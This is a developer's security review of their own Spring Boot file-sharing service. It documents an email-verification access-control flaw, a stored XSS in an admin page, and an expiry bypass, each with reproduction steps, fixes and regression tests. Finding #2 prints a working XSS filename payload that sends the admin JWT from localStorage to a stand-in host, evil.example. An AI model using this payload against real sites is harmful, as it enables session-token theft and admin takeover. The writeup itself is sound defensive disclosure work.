# SecShare — Security Review & Fixes

A self-review of my own file-sharing service (Spring Boot + PostgreSQL). I audited the
authentication, sharing, and download flows and found three issues worth writing up: a
**broken access-control** flaw that let an attacker read files shared to someone else, a
**stored XSS** that chained into admin account takeover, and an **authorization bypass**
where expired shares stayed downloadable on the authenticated path.

Each finding below includes the root cause, a reproduction, the fix, and the regression
test that now guards it. All three are fixed on the same branch; 13/13 end-to-end tests
pass against a real PostgreSQL (Testcontainers).

| # | Finding | Severity | Class |
|---|---------|----------|-------|
| 1 | Unverified email → unauthorized access to files shared with others | **Critical** | CWE-639 Authorization Bypass / IDOR, CWE-287 |
| 2 | Stored XSS in the admin file list → admin JWT theft | **High** | CWE-79 Stored XSS |
| 4 | Expired/exhausted shares still downloadable when authenticated | **Medium** | CWE-613 Insufficient Session/Access Expiration |

*(Numbering follows the original review; items 3, 5–8 were lower-severity hardening notes.)*

---

## Finding #1 — Broken access control via unverified email (Critical)

### Summary
Access to files shared to an address (an audience membership, or a direct USER grant) was
decided **solely from the `email` claim in the caller's JWT**, with no proof that the caller
actually owns that address. Registration performed no email verification, so anyone could
register an *unclaimed* address and receive files intended for its real owner.

### Root cause
Registration created a fully usable account with no ownership check:

```java
// AuthService.register (before)
if (userRepository.existsByEmailIgnoreCase(request.email())) {
    throw new ResponseStatusException(HttpStatus.CONFLICT, "Email already exists");
}
User user = new User();
user.setEmail(request.email().toLowerCase());
// ...no verification state, account is immediately active
```

The audience download check trusted the email claim directly:

```java
// FileService.getAccessibleFileOrThrow (before)
List<UUID> audienceIds = fileShareRepository.findActiveAudienceIds(fileId, ShareType.AUDIENCE);
isAudienceMember = !audienceIds.isEmpty() && audienceMemberRepository
        .existsByAudience_IdInAndEmailIgnoreCase(audienceIds, principal.email());
```

The USER-grant path had the same weakness — a grant resolves its recipient by address
(`userRepository.findByEmailIgnoreCase(req.recipientEmail())`), so whoever holds the account
for that address receives the grant.

### Reproduction
1. Victim `ali@firma.com` has **not** registered yet.
2. Owner shares a file to a 500-person audience that includes `ali@firma.com`.
3. Attacker registers `ali@firma.com` (allowed — the address is unclaimed) and logs in.
4. `GET /api/files/shared-with-me` lists the file; `GET /api/files/{id}` downloads it.
5. If the share's burn mode is `FIRST`, the file self-destructs on that download and the
   **real recipients never receive it** — so the attack is also destructive, not just a read.

### Impact
Confidential files disclosed to an attacker; with burn-after-reading, denial of delivery to
the legitimate recipients. No owner interaction required beyond the normal act of sharing.

### Fix
Introduce email verification and make it a precondition for receiving shared files:

- `User` gains `emailVerified`, `verificationToken`, `verificationExpiresAt`.
- `register` issues a 256-bit `SecureRandom` URL-safe token (24h TTL) and enqueues a
  verification email; the account starts **unverified**.
- New endpoints: `GET /api/auth/verify?token=…` (public, single-use) and
  `POST /api/auth/resend-verification` (authenticated).
- **Single choke point:** in `getAccessibleFileOrThrow`, any non-owner access now requires a
  verified email. This one gate closes both the audience path and the email-resolved USER
  grant path. `listSharedWithMe` returns nothing for an unverified account. Owners always
  reach their own uploads regardless of verification state.

```java
// FileService.getAccessibleFileOrThrow (after)
if (!isOwner) {
    User user = userRepository.findById(principal.userId())
            .orElseThrow(() -> new ResponseStatusException(HttpStatus.UNAUTHORIZED));
    if (!user.isEmailVerified()) {
        throw new ResponseStatusException(HttpStatus.FORBIDDEN,
                "Verify your email address before accessing files shared with you");
    }
}
```

### Design notes
- **Login does not require verification** — the security boundary is *receiving others'
  files*, not managing your own. Gating login would lock an unverified user out of the very
  flow that lets them verify.
- **Mail disabled (local/test):** no email is sent and the token is **never logged** (it is a
  bearer secret). It simply waits in the DB. Tests read it from the repository rather than
  leaking it in the HTTP response.
- **Existing accounts default to `false`** (fail-closed) and must re-verify, or be backfilled
  deliberately: `update users set email_verified = true where email in (...)`. A blanket
  `WHERE`-less update would be fail-open and is avoided.

### Regression test
`EmailVerificationE2ETest` reproduces the attack (register the recipient address → 403 on
download, empty `shared-with-me`), then verifies the token and asserts the intended access is
restored (file listed, bytes download). A third case confirms owners download their own files
without verifying.

---

## Finding #2 — Stored XSS in the admin file list → admin JWT theft (High)

### Summary
A legacy admin page rendered attacker-controlled filenames into the DOM without escaping.
Any user could store a payload by uploading a crafted filename; it executed in the
**admin's** browser when they opened the panel, exfiltrating the admin JWT from
same-origin `localStorage`.

### Root cause
`files.html` built table rows by string-interpolating the raw filename into `innerHTML`, and
the page fetched the admin-only listing:

```javascript
// files.html (before) — files come from GET /api/files/all (ROLE_ADMIN)
row.innerHTML = `
    <td>${f.originalFilename}</td>          // unescaped sink
    ...
    <td><button onclick="downloadFile('${f.id}', '${token}')">Download</button></td>`;
```

The JWT is persisted client-side at `localStorage.secshare_token` (set by `index.html`), and
`localStorage` is readable by any script on the origin. `SecurityConfig` also left
`/files.html`, `/test.html`, and `/h2-console/**` on `permitAll`.

### Reproduction
1. Any authenticated user uploads a file named:
   `<img src=x onerror="fetch('//evil.example/?t='+localStorage.secshare_token)">.pdf`
2. Admin opens `/files.html` and clicks *Load Files* (the admin listing).
3. The filename renders as HTML; `onerror` fires and ships the admin's JWT to the attacker.
4. Attacker replays the token as `ROLE_ADMIN` → full admin takeover.

### Impact
Stored XSS executing in an administrator's session, chaining to complete account/privilege
takeover. Combined with finding #1 this is a clean *broken-access-control + stored-XSS →
admin takeover* chain.

### Fix
- **Deleted** `files.html` and `test.html`. The current UI (`index.html`) already escapes all
  user-controlled strings via a `textContent`-based `escapeHtml()` and additionally escapes
  single quotes inside `onclick` handlers.
- Removed the `/files.html`, `/test.html`, and `/h2-console/**` `permitAll` rules from
  `SecurityConfig` (the H2 console isn't even active on this Postgres deployment — it was a
  latent unauthenticated-console exposure).

### Note
`test.html` had a lower-severity variant: its `escape()` helper HTML-encodes `< > &` but not
quotes, so a filename containing `'` could break out of a single-quoted `onclick` string.
Because that page listed only the viewer's *own* files and required a click, it was
effectively self-XSS — but it was removed along with `files.html`.

---

## Finding #4 — Expired/exhausted shares downloadable on the authenticated path (Medium)

### Summary
A share is "usable" only while **not revoked, not expired, and under its download limit**
(`FileShare.isActive()`). The anonymous public-link path enforced this and returned `410` once
a share expired, but the authenticated path checked **`revoked == false` only** — so a
signed-in grant recipient could keep downloading a share everyone else saw as dead.

### Root cause
```java
// before — revoked-only, ignores expiry and download limit
boolean isGranted = fileShareRepository
        .existsByFile_IdAndRecipient_IdAndRevokedFalse(fileId, principal.userId());

List<UUID> audienceIds = fileShareRepository.findActiveAudienceIds(fileId, ShareType.AUDIENCE);
// ^ JPQL filtered on fs.revoked = false, nothing else
```

### Reproduction
1. Owner shares a file to a recipient with `expiresInMinutes` set (or a `maxDownloads` limit).
2. After the share expires, the anonymous link `POST /api/public/shares/{token}/download`
   correctly returns `410 Gone`.
3. The same (signed-in) recipient calls `GET /api/files/{id}` and still receives the file —
   the expiry was never checked on this path.

### Impact
Time- and count-limited shares — a core self-destruct guarantee of the product — were not
actually enforced for authenticated recipients. Expiry is a promise to the data owner; this
silently broke it.

### Fix
Gate both grant paths on `isActive()` so the two code paths agree:

```java
// after
boolean isGranted = !isOwner && fileShareRepository
        .findByFile_IdAndRecipient_IdAndRevokedFalse(fileId, principal.userId())
        .map(FileShare::isActive)
        .orElse(false);

List<UUID> activeAudienceIds = fileShareRepository
        .findByFile_IdAndTypeAndRevokedFalse(fileId, ShareType.AUDIENCE)
        .stream()
        .filter(FileShare::isActive)
        .map(fs -> fs.getAudience().getId())
        .toList();
```

The now-dead `findActiveAudienceIds` query was removed, and `listSharedWithMe` was updated so
expired USER grants no longer appear in the recipient's list (the audience branch already
filtered on `isActive()`).

### Regression test
`SharedAccessExpiryE2ETest`: a **verified** recipient downloads a live audience share (200),
the share's `expiresAt` is aged into the past, and the authenticated download then returns
`403` with the share dropping out of `shared-with-me` — isolating the expiry check from the
verification check of finding #1.

---

## Test summary

Full-stack E2E against a throwaway PostgreSQL container (Testcontainers):

- `EmailVerificationE2ETest` — 3 cases (finding #1)
- `SharedAccessExpiryE2ETest` — 1 case (finding #4)
- `AuthE2ETest`, `FileShareE2ETest` — existing suites, unaffected

`./mvnw test` → **13 run, 0 failures, 0 errors.**
